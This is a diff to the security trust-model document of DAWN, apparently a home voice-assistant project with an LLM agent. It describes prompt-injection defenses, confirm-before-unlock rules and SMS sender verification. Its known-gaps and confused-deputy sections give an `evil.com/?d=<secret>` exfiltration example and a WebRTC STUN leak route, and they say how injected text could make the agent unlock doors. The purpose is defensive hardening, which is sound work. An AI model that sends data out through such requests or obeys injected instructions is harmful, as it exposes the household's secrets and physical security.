@@ -11,7 +11,7 @@ procedures, and recorded test results — lives in
 [SECURITY_HARDENING_GUIDE.md](SECURITY_HARDENING_GUIDE.md). Read this to understand what DAWN
 trusts; read that to deploy it safely.
 
-**Last updated**: September 2026.
+**Last updated**: October 2026.
 
 ## Table of Contents
 
@@ -22,6 +22,7 @@ trusts; read that to deploy it safely.
 - [Component Trust Boundaries](#component-trust-boundaries)
 - [The LLM Agent as a Confused Deputy](#the-llm-agent-as-a-confused-deputy)
 - [Prompt-Injection Hardening](#prompt-injection-hardening)
+- [Tool Images and Tool Definitions](#tool-images-and-tool-definitions)
 - [Cross-Origin / CSRF](#cross-origin--csrf)
 - [Known Gaps](#known-gaps)
 
@@ -89,22 +90,27 @@ WebSocket/HTTP handlers call `conn_require_admin()` (enforced in `webui_admin.c`
 | OTA fleet management | ✓ | ✗ | ✗ | ✗ | ✗ |
 | Secrets (API keys, tokens) | ✓ | ✗ | ✗ | ✗ | ✗ |
 
-¹ A messaging party converses through a bound "forever conversation" with the identity the
-operator linked. They are **not** a DAWN account and cannot authenticate; their authorization
-is entirely "the operator chose to link this channel." Their message text is **untrusted
-input** (see [Prompt-Injection Hardening](#prompt-injection-hardening)).
+¹ A messaging channel is linked by a DAWN user (a code from their account) and answers only
+the provider identity that linked it: in a group, only that member's messages. An SMS link
+also proves the number with a code texted to it. A text can still claim any number, so SMS
+turns are **unverified**: they read and prepare freely, and anything that acts waits for a
+reply code ([confused-deputy](#the-llm-agent-as-a-confused-deputy) item 5). Message text is
+**untrusted input** (see [Prompt-Injection Hardening](#prompt-injection-hardening)).
 
 ² **Real-world-action tools are NOT role-gated — this is a deliberate single-admin-home
 default, and a real risk otherwise.** The conversational tool path (`command_execute()` →
 registry callback, `llm_tools.c` / `command_executor.c`) contains **no `is_admin` check**.
-Tool availability is gated only by session *type* (`enabled_local` / `enabled_remote`) and an
-admin-wide config toggle — never by the acting user's role. So **any** authenticated session —
+Tool availability is gated by session *type* (`enabled_local` / `enabled_remote`), an
+admin-wide config toggle and the kind of turn (who may act: user, unverified SMS sender,
+background job, unattended; confused-deputy item 5), never by the acting user's role. So **any** authenticated session —
 a non-admin browser, or a satellite mapped to a non-admin user — can say *"unlock the front
-door"* and the assistant will invoke `home_assistant`. Only the WebUI HA **board** verb
+door"* and the assistant will invoke `home_assistant` (which previews the unlock and waits for
+that session's yes). Only the WebUI HA **board** verb
 (`handle_ha_call_service`, `conn_require_admin`-gated **and** `HA_BOARD_SERVICES[]`-allowlisted)
-and the **configuration** of these subsystems are admin-restricted. Phone and email add a
-two-step confirm (`confirm_outbound`), but that confirmation is satisfied by whoever is in the
-conversation, not by an admin. The phone banner's answer/reject fan-out to a satellite is
+and the **configuration** of these subsystems are admin-restricted. Phone (`confirm_outbound`, plus
+anything uncertain), email (always) and HA unlock/open preview and confirm, bound to that
+session's next turn, but the confirmation is satisfied by whoever is in the conversation, not
+by an admin. The phone banner's answer/reject fan-out to a satellite is
 display-only — but HA *control* is a genuine write capability from any session. This is the
 coarse-authorization gap (#4) and the [confused-deputy](#the-llm-agent-as-a-confused-deputy)
 surface: fine for a single-admin household, a real risk under multi-user or prompt injection.
@@ -180,11 +186,17 @@ DAWN's defenses against this are layered, and each is a real, shipped mechanism:
 
 1. **Capability flags at the registry** (`tool_registry.h`): every tool declares
    `TOOL_CAP_DANGEROUS` / `NETWORK` / `FILESYSTEM` / `SECRETS` / `SCHEDULABLE`. Dangerous
-   tools (e.g. shutdown) require an explicit config enable; the flags also drive what is
-   allowed in a scheduled context.
-2. **Two-step confirmation on irreversible outward actions**: email send/trash, phone
-   call/SMS (`confirm_outbound`), and document delete require a human confirmation turn — an
-   injected instruction cannot complete them autonomously.
+   tools (e.g. shutdown) require an explicit config enable; `SCHEDULABLE` marks a tool a
+   schedule may run, and `validate_schedulable_action` refuses individual actions (checked when
+   the schedule is made and when it fires).
+2. **Preview and confirm on irreversible actions**: email send/trash, phone call/SMS,
+   document delete, deep research, and Home Assistant unlock (any lock) and anything else that
+   opens a door: opening a garage-door or gate cover, or turning on a switch, scene, script or
+   automation named for a garage, gate, door or unlock. The confirm runs only in the same
+   session, in the user's very next turn (or, approved by the user's SMS reply code, a later
+   turn of that session), and only for the item its preview named (`core/pending_slots`, `turn_origin_t`), so a re-staged
+   item or a later "yes" can't carry out something else. Phone keeps its preview for anything
+   uncertain even with `confirm_outbound = false`.
 3. **The memory injection filter** (`memory_filter.c` → `memory_filter_check()`): a blocklist
    of high-confidence injection command/ReAct/XML patterns, applied at the untrusted-ingestion
    points — inbound messaging, web search/fetch, the note bridge, silent-observe, background-job
@@ -199,15 +211,28 @@ DAWN's defenses against this are layered, and each is a real, shipped mechanism:
    `home_assistant` tool**, which the tool path exposes to any authenticated session with no
    role check (footnote ² / Gap #4), so it is not a defense against injection in a chat session.
 
+5. **Who may make a call** (`core/tool_call_policy.c`, see
+   [command-processing.md](arch/command-processing.md#who-may-make-a-call-kinds-of-action)):
+   every tool action has a kind (read, fetch, state, device, prepare, act), and the turn decides
+   who is calling. A background job may read and fetch but never act; an unattended turn (a
+   job's follow-up, or no user turn at all) may only read and change session state. A text message can claim any sender,
+   so an SMS turn may read and prepare, and anything that acts, fetches or plays waits for a
+   6-digit code DAWN texts to the number; a forger never receives it. SMS conversations are
+   private, so a forged text is never learned into memory.
+6. **Recipients are never guessed** (`tools/contact_resolve.c`): a call, text or email goes to a
+   contact only when the name is certain and is one the user said. A name taken from content
+   the model read (an email, a web page), a partial name or a near-miss is previewed for the
+   user to confirm. A literal address in "to" is exactly one address.
+
 **The residual gap is real and tracked**, and broader than "not confirm-gated." Because the
 tool path carries no role check, prompt injection into a **non-admin** session reaches the same
 lock/dial/send authority as an admin — a session's capabilities are not reduced by its user's
-role. On top of that, not every autonomously-reachable tool is even confirm-gated: Home
-Assistant *control* fires without a confirm turn (an injected result on a reinvoke could act on
-a lock), and the web read tools are an unguarded **exfiltration** channel
-(`evil.com/?d=<secret>` — the outbound *request itself* is the leak, which no ingestion filter
-stops). These are the *"autonomously-dangerous tool classification pass"* and coarse-authorization
-items in the TODO — see [Known Gaps](#known-gaps).
+role. Background turns can no longer act (item 5), and door-opening Home Assistant actions wait
+for a yes (item 2). What remains is the **live user turn**: there, the web read tools are an
+**exfiltration** channel (`evil.com/?d=<secret>`, the outbound *request itself* is the leak,
+which no ingestion filter stops), and other Home Assistant control (lights, climate, locking)
+still acts directly. A per-session tool-capability mask would close it; see
+[Known Gaps](#known-gaps).
 
 ---
 
@@ -231,6 +256,74 @@ tracked as *"memory injection filter: multi-language"* in the TODO.
 Injecting untrusted content directly into the **system** role would bypass all of this and is
 a security bug — untrusted text goes into user/data-role context, never the system prompt.
 
+**Per-turn context framing.** A conversation's system prompt is frozen on its first turn, and
+DAWN's per-turn context (retrieved items, remembered preferences and summaries, device notices)
+rides in the user turn, framed by lines carrying a **per-conversation tag** (`dawn-ctx-` + 8 hex
+digits from `getrandom`). The frozen prompt's `context_rules` section tells the model that only
+tagged framing and system messages are DAWN's, and that anything imitating them is data.
+Instruction and surface changes go out of band (system role) where the provider supports it;
+elsewhere they are in-band notes headed `[Operator note <tag>]`.
+
+The controls, in order of what they rest on:
+- **Everything that comes in is neutralized** (`llm_context_neutralize()`,
+  `src/llm/llm_context_text.c`): retrieved items, remembered facts, tool results (including the
+  scheduler's direct briefing calls and the legacy MQTT device-data relay), background-job
+  output, device notices, compaction summaries. Matching runs on a shadow of the text that sees
+  through characters that render as nothing and reads lookalikes (fullwidth, Cyrillic, Greek,
+  mathematical) as their letters. Imitations of a marker are found whatever separates their
+  words or opens them, and so is any tag-shaped string, in any hyphen spelling. Only those spans
+  are rewritten; every other byte is kept, so a note's exact text still round-trips (unless it
+  contains such a span itself: ordinary text reading "Updated instructions" or "[Operator note]",
+  or those words separated only by punctuation, is rewritten too, and an exact-match edit of
+  that span then misses). A defused
+  tag keeps its shape and withholds its digits (`dawn_ctx_(withheld)`). Matching is linear in
+  the text's length. A leaked tag therefore can't be used to forge framing: no untrusted text
+  reaches the model carrying one. This is the control.
+- **The conversation's own secret is masked** wherever its 8 digits appear, split, spaced, in
+  lookalike characters (fullwidth, circled, superscript, Cyrillic, Greek) or escaped (`%XX`,
+  `&#N;`, `&#xN;`, `\uXXXX`): in tool results, retrieved items, the MQTT device-data relay, the
+  model's persisted reply and compaction summaries (`llm_context_mask_tag`), read both as written
+  and with escapes decoded so neither reading hides it. Background-job output and device notices
+  are neutralized but not masked. This is what stops a leaked secret being used: the
+  shape-matching above is best-effort.
+- **The secret doesn't go out through a tool**: a tool call whose arguments carry it, split,
+  spaced or encoded (JSON, URL, entity), is refused. This is a tripwire only: a sufficiently
+  transformed copy (base64, reversed, spread across calls) gets through.
+- **What isn't covered**: text streamed to TTS or a messaging channel as the model writes it is
+  delivered before the reply is finalized, so a secret the model was led to say is spoken or
+  sent. And the reply's stored turn blocks (what a Claude or Responses replay sends) aren't
+  rewritten, because they carry signed reasoning; a reply that wrote the tag replays it as the
+  assistant's text, never as DAWN's.
+
+**Forgotten items leave stored context.** Per-turn context is stored with the conversation so a
+reload replays the same request. A **user's removal** is recorded for withdrawal: forgetting a
+memory (the tool or the memory panel), deleting all memories, forgetting a conversation's
+memories, deleting or replacing a document, or deleting an account (its shared documents are
+in other users' conversations). A CI guard (`scripts/check_user_removal_marked.sh`) fails the
+build if a user-facing delete isn't marked. TEMP delete triggers on DAWN's own connection fire only while
+the removal is marked (`conv_db_withdraw_intent_begin`, `src/auth/auth_db_withdraw.c`).
+`session_withdraw_forgotten` then withdraws each removed item from every conversation it was
+injected into (a shared document's included), stored and in every live session, matching by
+item id, so a voice history not yet saved is covered. A turn built before the removal and saved after it is
+withdrawn as it is saved, as is a voice history saved later, within the week the removal is
+kept. The conversation leaves its earlier reasoning behind (signed reasoning may quote the item
+and can't be edited), including a reply that was streaming during the removal. Chunk ids are
+never reused since v94 (AUTOINCREMENT), so a removed chunk's record can't withdraw a new chunk.
+
+What is **not** withdrawn, stated plainly:
+- deletes that aren't the user's removal: nightly confidence decay, entity merges,
+  superseded-fact cleanup, re-indexing an edited note, dawn-admin's meta-fact cleanup and
+  re-extraction reset, and anything done in the sqlite3 shell; what was sent stays as it was
+  sent;
+- the model's own words about an item: assistant replies that quoted it, and `role:tool` rows
+  (memory search and recall results, document reads);
+- compaction summaries of earlier turns, and a background job's report that mentioned it;
+- calendar occurrences (the calendar's own sync removes those);
+- the debug chat logs (`logs/chat_history_*.json`) and daemon logs;
+- a running background job's in-memory history (it ends with its run).
+
+Deleting the conversation removes all of its rows.
+
 **Scheduled briefing summarization** is a self-contained instance of this pattern. The briefing's
 collected tool output is wrapped in `<briefing_data>` and summarized by a **tool-less** LLM turn,
 so injected data cannot invoke a tool. Forged fence tags in that data (`</briefing_data>`, a fake
@@ -244,6 +337,45 @@ content-shaping-plus-egress path — if the instructions channel is ever set via
 restructuring the summarization prompt. This composes with the autonomously-dangerous-tool /
 capability-mask work below (an injected owner turn that can write `instructions`/`deliver_to` is
 the same confused-deputy seam).
+
+---
+
+## Tool Images and Tool Definitions
+
+**Images a tool returns** (a camera capture) are private user data with their own lifecycle:
+
+- **Owner-only.** A capture is stored as the turn's user's (`IMAGE_SOURCE_CAPTURE`), readable by
+  that user alone (service tokens and other users are refused, as for uploads). A guest's capture
+  is never stored: it stays in that turn's memory.
+- **Kept for the conversation's lifetime.** The tool row that names a capture binds it when the
+  row is saved, and the conversation records it (`conversation_images`). Deleting the
+  conversation deletes the images only it names (rows in the delete's transaction, files after);
+  an image another conversation also names stays. Deleting an account purges the user's image
+  and document stores before the user row goes.
+- **Unbound captures are reclaimed.** One no saved row names (a turn that failed, a save never
+  retried) is deleted after 24 hours (`IMAGE_UNBOUND_GRACE_SEC`), unless a live session of **its
+  owner** still names it in unsaved history (a long voice session, a running background job).
+  Another user's session naming the id doesn't hold it. The sweep walks oldest first by a
+  cursor, so images held by live sessions can't keep it from reaching the rest.
+- **Bounded per request.** `models.toml [max_request_images]` caps the images and bytes one
+  request carries; a capture past it is refused and deleted in its turn.
+
+**Tool definitions are stored and replayed by value.** A conversation freezes the definitions
+of its tools on its first turn and appends later changes as rows (see
+[llm.md](arch/subsystems/llm.md#tools-on-the-wire)). An MCP server's definitions are text from
+outside DAWN that reaches every request of the conversations that saw them, so each must pass
+`llm_tool_def_valid()` (a plain name; description and schema within size caps; valid UTF-8)
+before it is stored. Changes are bounded per conversation and per MCP server per hour, so a
+server that keeps changing its tools can't grow every conversation's request without limit. A
+server that changes or disappears can't rewrite what a conversation already holds, and a
+compaction never feeds a definition's text to the summarizer.
+
+**Runtime values stay out of schemas.** A value set that changes at runtime (the HUD elements
+and modes MIRAGE announces over MQTT) would change a frozen schema, so it goes in the
+conversation's standing directions instead, and the tool's `validate_call` is the trust point: a
+call naming a value not in the live set is refused before it runs. Announced names reach every
+conversation's directions, so they are held to a plain shape (1 to 32 letters, digits, spaces,
+`_` or `-`, `hud_discovery.h`) and the number of changes applied per hour is capped.
 
 ---
 
@@ -276,13 +408,17 @@ Known Gaps.
 
 Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO item.
 
-1. **Not every autonomously-reachable tool is confirm-gated.** HA *control* (lock/cover/
-   climate) fires immediately, and the web read tools (`search`, `url`) are an unguarded
-   data-exfiltration channel — the outbound *request* to `evil.com/?d=<secret>` is the leak, so
-   the ingestion filter that scans fetched *content* does not help. A deliberate classification
-   pass over every registered tool (confirm-gated / autonomous-safe / autonomously-dangerous)
-   and, likely, a new capability/deny flag is the fix. *(TODO: "Tool audit:
-   autonomously-dangerous classification pass.")*
+1. **Exfiltration through web reads in a live user turn.** Every action now has a kind; a
+   background job can't act, and an unattended turn can't fetch (confused-deputy item 5), but in
+   a turn the user started,
+   the web read tools (`search`, `url`) can still carry data out: the outbound *request* to
+   `evil.com/?d=<secret>` is the leak, so the ingestion filter that scans fetched *content* does
+   not help. A per-session tool-capability mask ("propose, don't act" after reading untrusted
+   content) would close it; it is not built yet.
+   A rendered visual (`render_visual`) is the same channel from the browser: its script runs in
+   a sandboxed iframe that can't open connections (`connect-src 'none'`), load from other hosts,
+   submit forms or navigate, but WebRTC isn't covered by any CSP directive, so a visual can
+   still name an attacker's STUN host (a DNS lookup and a UDP packet) with data in it.
 
 2. **SSRF on the native web-fetch path — CLOSED for `url_fetch`/`search` (2026-08, deep-research
    branch); FlareSolverr residual remains.** The native curl path now installs a
@@ -306,11 +442,11 @@ Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO
    user's authority. More sharply: the conversational tool path performs **no role check
    whatsoever** — HA control, phone, and email send are reachable by *any* authenticated session
    (non-admin browser, satellite mapped to a non-admin, or a linked messaging channel), gated
-   only by session type + an admin-wide config toggle (footnote ² / the confused-deputy
-   section). Only the WebUI admin *board* verb and subsystem *configuration* are
-   `conn_require_admin`-gated. This is an accepted default for a single-admin household; a
-   per-capability grant and a "propose, don't act" tool-mask for background/reinvoke turns would
-   close it and compose with gap #1.
+   by session type, an admin-wide config toggle and the kind of turn, not the user's role
+   (footnote ² / the confused-deputy section). Only the WebUI admin *board* verb and subsystem
+   *configuration* are `conn_require_admin`-gated. This is an accepted default for a
+   single-admin household; a per-capability grant would close it. Background and unattended
+   turns already can't act; the live user turn is gap #1.
 
 5. **Cleartext credentials over `ws://`/`http://` on the LAN.** The HA long-lived token (and,
    historically, REST traffic) crosses the LAN in cleartext when TLS is not configured for the
@@ -338,8 +474,7 @@ Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO
    reinforced — so no cross-user reach and no fact creation), and each bump is rate-limited to
    once per fact per hour, clamped (≤0.5), and ceilinged at 1.0. The durable fix is to withhold
    reinforcement on turns that ran an outward-reading tool, which composes with gap #1's
-   capability mask. *(TODO: "Tool audit: autonomously-dangerous classification pass" /
-   `CAPABILITY_MASK_DESIGN.md`.)*
+   per-session tool-capability mask (not built yet).
 
 10. **Schwab enrollment is operator-trust (SO_PEERCRED), not admin-password-gated.** The
    `dawn-admin schwab auth`/`status` opcodes (`0xE3-0xE5`) sit in the same peer-cred operator
